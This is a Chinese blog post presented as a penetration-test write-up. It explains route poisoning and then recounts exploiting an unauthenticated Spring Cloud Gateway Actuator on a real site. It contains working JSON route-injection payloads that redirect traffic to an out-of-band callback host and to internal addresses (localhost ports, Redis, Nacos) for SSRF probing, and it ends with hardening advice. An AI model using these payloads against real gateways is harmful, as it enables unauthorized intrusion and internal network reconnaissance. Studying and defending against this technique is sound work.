@@ -1,0 +1,319 @@
+
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ShoreKiten/p/22569533" title="发布于 2026-08-19 14:28">
+    
+
+    <span role="heading" aria-level="2">从 Actuator 未授权到应用层路由投毒：记一次 Spring Cloud Gateway 动态路由渗透实录</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                    <div id="cnblogs_post_description" style="display: none">
+        
+        本文探讨了路由投毒攻击的原理与实践案例，重点分析了应用层场景下的Spring Cloud Gateway攻击路径。文章首先定义了路由相关基础概念，包括路由表、动态更新机制和信任边界等核心要素，随后详细阐述了路由投毒的两种类型及其攻击原理（网络层与应用层）。通过一个实际案例复盘，展示了如何利用未授权的Actuator端点实现路由注入，最终控制流量转发路径。研究揭示了现代应用架构中路由组件的安全脆弱性，强调了对管理接口实施严格访问控制的必要性。该技术分析仅供安全防御研究，严禁用于任何非法网络活动。
+    </div>
+<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<blockquote>
+<p>免责声明:<br>
+<strong>用途限定</strong><br>
+本文档内容仅供网络安全技术人员及合规从业者于授权环境下进行学术交流、技术研讨与防御能力建设之用，旨在提升网络安全防护意识。<br>
+<strong>禁止行为</strong><br>
+文中涉及的所有技术原理、操作步骤、代码示例及工具说明，严禁直接或间接用于以下任何行为：<br>
+未经授权的网络扫描、渗透测试或系统入侵；<br>
+非法获取、篡改、破坏或泄露他人数据信息；<br>
+干扰、瘫痪或恶意控制任何计算机系统、网络设施或物联网设备；<br>
+其他违反《中华人民共和国网络安全法》《中华人民共和国刑法》及相关国际公约的活动。<br>
+<strong>法律后果自担</strong><br>
+任何个人或组织若将本文内容用于非法目的或未授权场景，其所产生的全部法律责任（包括但不限于行政处罚、民事赔偿及刑事责任）及衍生风险，均由使用者自行承担。<br>
+<strong>平台免责</strong><br>
+文章作者、发布平台对上述违规使用行为不提供任何明示或默示的支持、鼓励或协助，且不对由此引发的任何直接、间接、偶然或惩罚性损害承担连带责任。<br>
+<strong>合规提醒</strong><br>
+建议读者在实施任何技术操作前，确保已获得相应系统所有者的书面授权，并严格遵循所在组织的信息安全政策与法律法规。</p>
+</blockquote>
+<p>之前测一个站点的时候先自己手工测了一遍，然后技术不行测不出来，让ai蹬了一下出来一个<strong>路由投毒</strong>，因此本文也是作为一篇学习记录。当然了在开始之前得了解基础概念。</p>
+<h1 id="前置">前置</h1>
+<h2 id="路由">路由</h2>
+<p><strong>路由是指根据网络中的拓扑结构和路由策略，决定数据包从源节点到目标节点的传输路径</strong>。在路由过程中，数据包会经过多个中间节点（路由器）进行转发，直到达到目标节点。路由的主要目标是选择最佳路径，使数据包能够高效地传输，并兼顾网络的性能、可靠性和安全性。</p>
+<h2 id="动态路由协议">动态路由协议</h2>
+<p><strong>路由器之间通过特定协议自动交换网络拓扑信息。</strong></p>
+<p>距离矢量协议：如<code>RIP</code> 路由器仅与直连邻居交换完整路由表，以跳数为度量标准。信任邻居通告的信息，缺乏全局拓扑视图。</p>
+<p>链路状态协议：如<code>OSPF</code> 路由器广播链路状态通告（LSA），所有路由器独立构建完整的拓扑数据库并计算最短路径。</p>
+<h2 id="路由表">路由表</h2>
+<p>存储在路由器或网关内存中的数据结构，本质是一张<strong>目标地址 → 下一跳/处理动作</strong>的<strong>映射表</strong>。</p>
+<p>每当数据包/请求到达时，设备查此表决定往哪里送或怎么处理，但是这里不能类比为“地图”或“导航”。<strong>它更接近数据库中的索引表：查询条件匹配某条记录，则执行该记录指定的操作。无匹配则有默认规则或丢弃。</strong><br>
+关键点：<strong>路由表是可写的</strong>。设备启动时加载初始表项，运行期间可通过<code>协议、API或管理接口</code>动态增删改。路由投毒攻击的目标就是这张表的写入过程。</p>
+<h2 id="路由更新">路由更新</h2>
+<p>路由更新指的是<strong>向路由表写入新条目或修改现有条目的操作</strong>，这里要区别合法和非法的形式</p>
+<p>合法形式：<br>
+网络层：路由器之间通过<code>RIP/OSPF/BGP</code>等协议<strong>自动交换拓扑变化信息</strong>。<br>
+应用层：管理员通过CLI、REST API（如<code>Spring Cloud Gateway Actuator</code>）<strong>手动配置路由规则</strong>。</p>
+<p>非法形式：<br>
+攻击者伪造更新消息或调用未授权接口，向路由表<strong>注入非预期条目</strong>。</p>
+<p>路由更新本身是中性机制。问题在于<strong>更新来源是否可信、内容是否被验证</strong>。传统路由协议早期版本（如RIPv1）和未加固的Actuator端点均缺乏验证，使恶意更新与合法更新在技术上不可区分。</p>
+<h2 id="度量值与路径选择">度量值与路径选择</h2>
+<p>度量值是指<strong>路由表中每条记录附带的数值或属性</strong>，在路由中用于判断路由路径的优先级，直接影响数据包的转发路径。<br>
+不同的路由协议使用不同的度量值计算方法：</p>
+<p>网络层示例：RIP用跳数，OSPF用带宽倒数计算的Cost，<code>BGP用AS_PATH长度+本地偏好</code>等多属性组合。<br>
+应用层示例：<code>Spring Cloud Gateway</code>中，<code>Predicate</code>的匹配顺序、<code>Filter</code>链的执行优先级、路由定义的注册顺序均构成隐式度量。</p>
+<p>度量值的比较过程是路由优选的依据之一，只有当路由优先级相同时，才会使用路由度量进行比较。<strong>度量值数值越小越优先</strong>，路由投毒常通过<code>伪造更优度量值</code>（如更小跳数、更高优先级Predicate）使恶意路由被优先选中。若无法伪造度量值，则可能直接覆盖原有同名路由条目</p>
+<h2 id="信任边界">信任边界</h2>
+<p><strong>系统设计中预设的“可信区域”与“不可信区域”的分界</strong><br>
+路由协议的原始假设：<strong>同一自治系统内的所有路由器互信；管理接口仅内网管理员可访问</strong>。<br>
+但在真实环境下往往如下：<br>
+攻击者成功接入内网<br>
+Actuator端点暴露于公网或未加认证，外部请求被视为合法管理操作</p>
+<h2 id="控制平面与数据平面分离">控制平面与数据平面分离</h2>
+<p>控制平面：<strong>构建与维护路由表的逻辑</strong>（路由协议进程、Actuator API、配置同步模块）<br>
+数据平面：<strong>依据路由表实际转发流量</strong>（路由器ASIC/转发表、Gateway Netty过滤器链）<br>
+攻击定位：路由投毒是针对控制平面的攻击，损害体现在数据平面。攻击者不直接拦截流量，而是污染决策数据，使数据平面执行错误转发。</p>
+<hr>
+<h1 id="路由投毒">路由投毒</h1>
+<h2 id="定义">定义</h2>
+<p>路由投毒是指通过未授权或伪造的手段，向路由决策系统的<strong>控制平面注入、篡改或删除路由条目</strong>，致使数据平面依据被污染的路由表<strong>执行非预期转发行为</strong>的技术现象。</p>
+<p>该定义涵盖两个互斥子类：<br>
+<strong>恶意路由投毒</strong>：攻击者主动实施的破坏性行为，目标是破坏网络可用性、机密性或完整性。本文后续内容均指此子类。<br>
+<strong>防环路由中毒</strong>（：距离矢量协议（如RIP）中，路由器在链路失效时主动将对应路由度量值设为无穷大，以通知邻居该路径不可达，防止计数到无穷问题。此为协议标准规定的正常机制，非安全威胁。</p>
+<p><strong>作用层级扩展</strong>：传统定义限于OSI第3层（网络层），但现代软件定义网络、API网关、服务网格等应用层基础设施同样存在路由决策平面。凡具备“<strong>路由表 + 动态更新机制 + 信任假设</strong>”三要素的系统，均适用路由投毒分析框架。<code>Spring Cloud Gateway Actuator</code><strong>未授权路由注册</strong>即属应用层实例。</p>
+<h2 id="攻击原理">攻击原理</h2>
+<p>分了网络层和应用层，这里网络层跟本文涉及到的路由投毒无关，<strong>重点关注应用层路由投毒</strong></p>
+<h3 id="网络层攻击原理">网络层攻击原理</h3>
+<ol>
+<li><strong>RIP</strong>（Routing Information Protocol）<br>
+<strong>协议特性</strong>：距离矢量协议；UDP 520；最大跳数15（16=不可达）；默认无认证（RIPv1完全无，RIPv2可选明文/MD5）。<br>
+<strong>攻击方式</strong>：攻击者接入网络后，周期性发送伪造<code>RIPv2 Response</code>报文，通告目标网络经由攻击者主机可达且跳数为1。<br>
+<strong>生效条件</strong>：受害者路由器收到伪造报文后，因跳数优于现有路由（或无现有路由），将其加入路由表。<br>
+<strong>维持要求</strong>：必须持续发送伪造报文；若停止超过180秒，路由将被标记为不可达。<br>
+<strong>局限性</strong>：仅适用于小型扁平网络；跳数&gt;15的路由被忽略；现代网络极少部署纯RIP环境。</li>
+<li><strong>OSPF</strong>（Open Shortest Path First）<br>
+<strong>协议特性</strong>：链路状态协议；IP协议号89；支持区域划分；LSA（Link State Advertisement）泛洪构建全局拓扑数据库；可选认证（Null/明文/MD5/SHA）。<br>
+<strong>攻击方式</strong>：<br>
+1.<strong>伪造LSA</strong>：若区域未启用认证或密钥泄露，攻击者构造Type-1（Router LSA）或Type-2（Network LSA），声明与目标网络直连且Cost极低，泛洪至整个区域。<br>
+2.<strong>DR/BDR劫持</strong>：在多路访问网络中，通过伪造更高Router ID或Priority成为指定路由器，垄断LSA生成权。<br>
+<strong>生效条件</strong>：LSA序列号高于当前数据库中的对应条目，且Age未过期。<br>
+<strong>维持要求</strong>：LSA有3600秒MaxAge；攻击者需定期刷新伪造LSA以防老化。<br>
+<strong>检测难点</strong>：合法LSA与伪造LSA格式完全一致；仅能通过序列号异常、拓扑不一致或认证失败日志间接发现。</li>
+<li><strong>BGP</strong>（Border Gateway Protocol）<br>
+<strong>协议特性</strong>：路径矢量协议；TCP 179；基于AS_PATH属性选路；支持丰富的策略控制；可选MD5/TCP-AO认证。<br>
+<strong>攻击方式</strong>：<br>
+1.<strong>前缀劫持</strong>：宣告更具体的前缀（如原宣告192.0.2.0/24，攻击者宣告192.0.2.0/25），利用最长前缀匹配原则吸引流量。<br>
+2.<strong>AS_PATH伪造</strong>：缩短AS_PATH长度或插入高偏好AS号，使本AS路径被优选。<br>
+3.<strong>会话劫持</strong>：若TCP MD5密钥泄露或未启用，重置合法BGP会话并接管连接。<br>
+<strong>生效条件</strong>：UPDATE报文经TCP传输且通过（或未启用）认证；接收方本地策略未过滤该前缀。<br>
+<strong>影响范围</strong>：全球互联网或跨AS域；单次成功宣告即可持续生效，无需周期性重发</li>
+</ol>
+<h3 id="应用层攻击原理以spring-cloud-gateway为例">应用层攻击原理（以Spring Cloud Gateway为例）</h3>
+<p><strong>系统特性</strong>：基于 Java/Spring 的微服务 API 网关；路由定义存储在内存（或 Redis）中；通过 <code>Actuator REST API</code> 进行动态管理；<strong>默认情况下无认证机制</strong>。</p>
+<p><strong>攻击方式</strong>：</p>
+<ol>
+<li><strong>路由注册</strong>：向 <code>POST /actuator/gateway/routes/{id}</code> 端点提交 JSON 格式的 <code>RouteDefinition</code>，指定 Predicate（如 Path 匹配）、Filter（如 RewritePath）以及目标 URI。</li>
+<li><strong>路由刷新</strong>：调用 <code>POST /actuator/gateway/refresh</code> 触发路由表重载，使新定义的路由立即生效。</li>
+<li><strong>缓存清除（可选）</strong>：执行 <code>DELETE /actuator/caches</code> 以清除缓存，确保新路由被正确加载。</li>
+</ol>
+<p><strong>生效条件</strong>：Actuator 端点可被外部访问且未配置认证；提交的 JSON 格式合法；目标 URI 语法有效。</p>
+<p><strong>维持要求</strong>：路由定义写入内存后即持久生效，无需像传统路由协议那样周期性重发；但若网关服务重启且路由未持久化到外部存储（如 Redis），则攻击注入的路由会丢失。</p>
+<p><strong>利用约束</strong>：</p>
+<ul>
+<li>Filter 表达式的执行受到沙箱限制（例如 <code>RedisRouteDefinitionWriter</code> 会禁用 SpEL 表达式）。</li>
+<li>要实现 SSRF或 RCE等攻击升级，还依赖于具体的运行时环境以及后端服务的可达性。</li>
+</ul>
+<p><strong>与传统路由协议的关键差异</strong>：攻击表现为一次性写入、使用 HTTP 作为载体、针对业务语义路由、且系统通常存在隐式的信任边界（默认内网可信）。</p>
+<hr>
+<h1 id="复盘">复盘</h1>
+<p>下面就是复盘发现了，首先这里actuator是可以进行访问的，其中有一个<code>actuator/mapping</code>:<br>
+<strong>描述全部的 URI路径，以及它们和控制器(包含Actuator端点)的映射关系</strong><br>
+说起来之前还没怎么关注过这个，都是<code>env</code>和<code>heapdump</code>，在这里面首先便是<code>gataway/refresh</code>,用于触发网关路由表的运行时<strong>重载</strong>：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142314814-1510901111.png" alt="image" loading="lazy"></p>
+<p>尝试调用该端点：<br>
+<img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142321626-1051364911.png" alt="image" loading="lazy"></p>
+<p>可以看到成功返回200，则证明该端点未授权可达，那么下一步可以尝试写入，在之前的<code>mappings</code>中找到相应端点：<br>
+<img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142329371-984252404.png" alt="image" loading="lazy"></p>
+<p><code>/actuator/gateway/routes/{id}</code>端点做的事就是把JSON 反序列化成 <code>RouteDefinition</code> 对象，存进 <code>RouteDefinitionLocator</code>（路由表），公开类标准如下：</p>
+<pre><code class="language-json">  public class RouteDefinition {
+      private String id;                              // 路由 ID
+      private URI uri;                                // 转发目标
+      private List&lt;PredicateDefinition&gt; predicates;   // 匹配条件
+      private List&lt;FilterDefinition&gt; filters;         // 过滤器
+      private int order;                              // 优先级
+  }
+</code></pre>
+<p>可构造如下通用形式：</p>
+<pre><code class="language-json">  "predicates": [{
+      "name": "Path",                                    // 断言工厂名
+      "args": { "_genkey_0": "/test111/**" }         // 工厂参数: 路径匹配规则
+    }],
+    "filters": [],                                       // 无过滤器, 原样转发
+    "uri": "http://dnslog",  // ★转发目标 = 投毒点
+    "order": 0
+  }
+</code></pre>
+<table>
+<thead>
+<tr>
+<th style="text-align: left">字段</th>
+<th style="text-align: left">类型</th>
+<th style="text-align: left">默认值</th>
+<th style="text-align: left">安全相关性</th>
+<th style="text-align: left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left"><code>id</code></td>
+<td style="text-align: left"><code>String</code></td>
+<td style="text-align: left"><code>null</code>（必填）</td>
+<td style="text-align: left">路由唯一标识；POST 时若指定已存在 ID 则覆盖原路由</td>
+<td style="text-align: left">—</td>
+</tr>
+<tr>
+<td style="text-align: left"><code>uri</code></td>
+<td style="text-align: left"><code>URI</code></td>
+<td style="text-align: left"><code>null</code>（必填）</td>
+<td style="text-align: left"><strong>投毒核心/SSRF 风险点</strong>。支持 <code>lb://</code>、<code>http://</code>、<code>forward:</code> 等 scheme</td>
+<td style="text-align: left">转发目标，可以是 <code>http://攻击者域</code>、<code>lb://微服务名</code>、<code>http://127.0.0.1:8888</code>（内网 SSRF）</td>
+</tr>
+<tr>
+<td style="text-align: left"><code>predicates</code></td>
+<td style="text-align: left"><code>List</code></td>
+<td style="text-align: left">空列表</td>
+<td style="text-align: left">匹配条件；决定哪些请求命中此路由；<code>Path</code>/<code>Header</code>/<code>Query</code> 等</td>
+<td style="text-align: left">断言工厂，必须是网关已注册的工厂名：<code>Path</code> / <code>Query</code> / <code>Method</code> / <code>Header</code> / <code>Host</code> / <code>Cookie</code> / <code>After</code> / <code>RemoteAddr</code>...</td>
+</tr>
+<tr>
+<td style="text-align: left"><code>filters</code></td>
+<td style="text-align: left"><code>List</code></td>
+<td style="text-align: left">空列表</td>
+<td style="text-align: left"><strong>RCE/信息泄露潜在载体</strong>。可改写请求/响应、重定向、鉴权等</td>
+<td style="text-align: left">留空 = 原样转发；可加 <code>StripPrefix</code>（去前缀）、<code>RewritePath</code>（改写路径）</td>
+</tr>
+<tr>
+<td style="text-align: left"><code>order</code></td>
+<td style="text-align: left"><code>int</code></td>
+<td style="text-align: left"><code>0</code></td>
+<td style="text-align: left">投毒时常设为极小值以抢占匹配</td>
+<td style="text-align: left">数字越小越先匹配</td>
+</tr>
+<tr>
+<td style="text-align: left"><code>args._genkey_N</code></td>
+<td style="text-align: left">—</td>
+<td style="text-align: left">—</td>
+<td style="text-align: left">工厂参数的键名格式，见下方"为什么是 _genkey_0"</td>
+<td style="text-align: left">断言或过滤器的具体参数，通过 <code>_genkey_0</code>、<code>_genkey_1</code> 等序号键传递</td>
+</tr>
+</tbody>
+</table>
+<p>其中<code> _genkey_0</code>是 Spring Cloud Gateway 的<code>properties </code>快捷绑定占位键,正常配置如下：</p>
+<pre><code class="language-json">  spring:
+    cloud:
+      gateway:
+        routes:
+          - id: myroute
+            uri: http://xxx
+            predicates:
+              - Path=/foo/** 
+</code></pre>
+<p>Spring Boot 的 Binder 把<code>Path=/foo/**</code>这个字符串拆成 <code>name=Path + args={_genkey_0: /foo/**}</code> <em>genkey</em>（<strong>generated key</strong>）就是自动生成的参数占位键，下标从 0递增。actuator 的 POST 端点接收的就是这个绑定后的格式，即<strong>官方约定</strong><br>
+那么下面就可以尝试创建新路由：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142350148-2081760937.png" alt="image" loading="lazy"></p>
+<p>可以看到成功注册一个新的路由，然后在访问<code>https://xxx.com/test123/anything</code>之前还需要刷新一下进行重载，但是后面碰到一个问题：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142400231-1948968506.png" alt="image" loading="lazy"></p>
+<p>这里显示404，然后burp里面也没有收到相应回显，那么就可能是之前的构造有问题，需要<strong>加上nginx放行的白名单前缀</strong>，尝试采用<code>order</code>，进行如下构造：</p>
+<pre><code class="language-js">{"predicates":[{"name":"Path","args":{"_genkey_0":"/order/test0/**"}}],"filters":[],"uri":"http://xxxoastify.com","order":-100}
+</code></pre>
+<p>然后再刷新，访问，这时候成功收到回显：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142410224-2030684877.png" alt="image" loading="lazy"></p>
+<p>那么接下来便是尝试SSRF打内网了，这里先不看<code>env</code>里面的内容，就先拿127.0.0.1来说，构造如下请求：</p>
+<pre><code class="language-json">{"predicates":[{"name":"Path","args":{"_genkey_0":"/order/rtest2/**"}}],"filters":[],"uri":"http://127.0.0.1:80","order":-100}
+</code></pre>
+<p>然后重载一下路由再进行访问，但是这里又返回了404：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142431138-340409822.png" alt="image" loading="lazy"></p>
+<p>如果是再够一个不存在的路径，那么结构是这样的：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142443778-246795339.png" alt="image" loading="lazy"></p>
+<p>这里就是一个<strong>非常重要的点</strong>了：</p>
+<p>首先<code>/order/123</code>没有匹配之前设置的<code>order/rtest2</code>前缀，因此这里是<code>order</code>的<strong>业务路由</strong>，因此会转发到订单服务，而这个首先需要进行认证，没有带上token便会抛出认证异常，那么最后便会显示如图所示的内容。</p>
+<p>而<code>order/rtest2</code>则是<strong>rtest2</strong>路由接管了 <code>/order/rtest2/</code>流量，转发到 <code>http://127.0.0.1:80</code>，本机 nginx 没有匹配这个路径的 <strong>location</strong>【即路径匹配规则】，返回默认 404</p>
+<p>location一般配置如下：</p>
+<pre><code class="language-json">  server {
+      listen 80;
+
+      # 路径以 /api 开头 → 转发给后端网关
+      location /api {
+          proxy_pass http://127.0.0.1:8080;
+      }
+
+      # 路径以 /static 开头 → 直接读本地静态文件
+      location /static {
+          root /data/www;
+      }
+
+      # 其他所有没匹配上的路径 → 直接返回 404
+      location / {
+          return 404;
+      }
+  }
+</code></pre>
+<p>再之后就是找真正在内网运行的的应用了，常见的端点都可以试一试，然后这里构造有一个技巧：</p>
+<pre><code class="language-json">  {"predicates":[{"name":"Path","args":{"_genkey_0":"/order/rtest2/**"}}],
+   "filters":[{"name":"StripPrefix","args":{"_genkey_0":"2"}}],
+   "uri":"http://127.0.0.1:8848 ","order":-100}
+</code></pre>
+<p><strong>filters 里的 StripPrefix=2</strong> <code>/order/rtest2/</code>是两条前缀，网关转发时默认带着原路径发给内网（GET<br>
+<code>/order/rtest2/nacos/v1/cs/configs → Nacos 404</code>）。<strong>StripPrefix</strong> 把前 N 段剥掉，内网服务收到的就是干净路径<code>/nacos/v1/cs/configs</code>。</p>
+<p>这里又出现了第三个404界面，明显是<strong>Tomcat</strong>：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142454533-1101989375.png" alt="image" loading="lazy"></p>
+<p>这说明 <strong>127.0.0.1:8848</strong> 上跑的是一个空 Tomcat，没有任何应用部署在根路径</p>
+<p>同时这也证明了<strong>请求真的打到了网关本机的 8848 端口并拿到了应用层响应</strong>，那么接下来就是尝试找内网机器了，经过一番测试首先是3306：<br>
+<img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142509364-375496650.png" alt="image" loading="lazy"></p>
+<p><code>finishConnect failed</code>指的是网关向 <code>127.0.0.1:3306 </code>发起 TCP 连接被拒,则MySQL 不在本机</p>
+<p>然后是6379：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142515465-1522992915.png" alt="image" loading="lazy"></p>
+<p><code>-ERR</code> 是 <code>Redis RESP</code> 协议的<strong>响应前缀</strong>（-ERR unknown command ...）这里就证明了是运行着redis的，但是<code>Spring Cloud Gateway </code>的 uri 只支持 <code>http/https/ws</code>，不支持 <code>gopher</code></p>
+<p>然后其他几个常见端口也测过了也没有东西，还想测内网的话那么就得到<code>env</code>里面去找内网地址了，这里就不具体放出来了，主要是其中一个ip和端口号，构造如下请求：</p>
+<pre><code class="language-json">  {"predicates":[{"name":"Path","args":{"_genkey_0":"/order/rtest2/**"}}],
+   "filters":[{"name":"StripPrefix","args":{"_genkey_0":"2"}}],
+   "uri":"http://ip:port","order":-102}
+</code></pre>
+<p>然后进行访问，终于有点不一样的地方了：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142525599-1399096227.png" alt="image" loading="lazy"></p>
+<p>Springboot经典报错页面，这就完全<strong>证实了路由投毒的可行性</strong>，在这里就相当于读取构造的内网的路径，即<code>http://ip:port/1</code>，而这个路径不存在，所以就会报错，既然这样的话，那么内网会不会也存在actuator呢，尝试进行构造之后发现并没有相应的数据，那么可能还存在固定前缀，而之前<strong>env</strong>里面有另一个内网地址，测了nacos但是显示404，那么在这里同样也进行尝试，在这里有一个关键的突破口：<code>nacos/auth/user</code></p>
+<p>输入这个路径之后服务器会重定向到另一个内网地址的登陆界面，而去掉nacos则还是原来的报错界面，说明这里的前缀就是<strong>nacos</strong>，auth/user进行了鉴权没有登录便会重定向到<code>auth/login</code>界面，完全证实了<code>context-path</code>就是nacos。</p>
+<p>那么加上这个前缀再跑个actuator，手工或者工具皆可，这样就会出现具体的数据了</p>
+<p><img src="https://img2024.cnblogs.com/blog/3768710/202608/3768710-20260819142551020-3026397.png" alt="image" loading="lazy"></p>
+<p>同时还有<code>admin/v2/api-docs</code>等等，再往下去就是内网的进一步渗透了，这里就不再描述了。</p>
+<hr>
+<h1 id="写在最后">写在最后</h1>
+<p>至此，一次从 Actuator 未授权端点入手，到最终验证应用层路由投毒可行性、并触达内网关键服务的完整攻击链已清晰呈现。回看整条路径：</p>
+<p><strong>信息泄露</strong>：<code>/actuator/mappings</code> 暴露了网关动态路由管理接口；<br>
+<strong>权限绕过</strong>：<code>/actuator/gateway/refresh</code> 与<code> /routes/{id}</code> 未做认证，允许外部写入；<br>
+<strong>路由污染</strong>：通过构造低 order 的恶意 <code>RouteDefinition</code>，将特定 Path 流量劫持至攻击者控制的 URI；<br>
+<strong>前缀剥离</strong>：利用 <code>StripPrefix</code> 过滤器适配内网服务的真实路径格式；<br>
+<strong>内网探测</strong>：以网关为跳板，向本机及内网 IP 发起 SSRF 请求，通过响应特征（<code>Tomcat 404、Redis 错误、SpringBoot 报错、Nacos 重定向</code>）逐步推断存活服务与上下文路径；<br>
+<strong>横向渗透</strong>：最终定位到内网 Nacos 等管理组件，为进一步的攻击提供了入口。</p>
+<p>这并非高深莫测的 0‑day，而是由配置疏忽 + 默认信任假设共同酿成的“低级但致命”组合漏洞。它提醒我们：</p>
+<p><strong>控制平面即攻击面</strong>——任何能修改路由表的接口（无论是 RIP/BGP 还是 Actuator/REST API）都必须置于严格的认证与授权之下，绝不能依赖“内网安全”的隐性假设；<br>
+<strong>路由投毒是决策层污染</strong>——它不直接攻破系统，却让系统主动将流量送往攻击者指定的目的地，其隐蔽性远高于传统的流量嗅探或中间人劫持；<br>
+<strong>网关是现代架构的新核心路由器</strong>——在微服务和云原生环境下，API 网关的路由表等同于传统网络的全局路由表，它的安全性应被提升至与边界路由器同等重要的等级。</p>
+<p>对于防御方，至少可以从以下几方面加固：</p>
+<p><strong>Actuator 端点强制认证</strong>：使用 <code>spring.security</code> 或独立鉴权过滤器，为所有 <code>/actuator/**</code> 路径配置角色控制，避免暴露于公网；<br>
+<strong>动态路由变更审计</strong>：对路由注册、刷新、删除操作记录详细日志，并设置异常告警（如短时间内大量新增路由或超低 order 值）；<br>
+<strong>入站路由校验</strong>：网关应校验 <code>RouteDefinition</code> 的 uri 白名单（仅允许内部服务名或特定外网域），禁止指向内网 IP 段或本地回环地址；<br>
+<strong>网络层隔离</strong>：将管理网络与业务网络分离，确保 Actuator 端口仅对受信任的堡垒机开放；<br>
+<strong>定期渗透测试</strong>：将动态路由接口纳入常规安全测试用例，检查是否存在未授权写入、SSRF 等问题。</p>
+
+
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-08-19 14:29">2026-08-19 14:28</span>&nbsp;
+<a href="https://www.cnblogs.com/ShoreKiten">ShoreKiten</a>&nbsp;
+阅读(<span id="post_view_count">0</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(22569533);return false;">收藏</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2FShoreKiten%2Fp%2F22569533&amp;targetId=22569533&amp;targetType=0" target="_blank">举报</a>
+</div>
+        
